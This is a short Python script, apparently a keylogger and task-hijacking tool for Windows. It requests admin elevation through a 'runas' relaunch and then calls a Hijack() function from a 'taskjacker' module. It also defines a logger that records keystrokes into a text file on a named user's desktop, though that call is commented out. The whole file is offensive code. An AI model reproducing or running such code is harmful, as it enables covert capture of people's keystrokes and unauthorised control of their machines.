from keyboard import record
import ctypes #Funny C in Py
from sys import executable, argv
from os.path import join
from taskjacker import Hijack

output = open(join('C:/Users/lhill23/Desktop', 'log.txt'), 'w')
c = (ctypes.windll.shell32)
#Applications infact do not get left alone by UAC if launched as admin. Screw you dude on stack overflow thread from 7 years ago, its you and not 7 years
def Log():
    r = record(until='|')
    r = str(r)
    r = r.replace("KeyboardEvent(", '')
    r = r.replace(',', '')
    r = r.replace("down)", ',')
    r = r.replace("up)", '\'')
    output.write(r)

if __name__ == "__main__":
    if not c.IsUserAnAdmin():
        c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None)
    Hijack()
    #Log()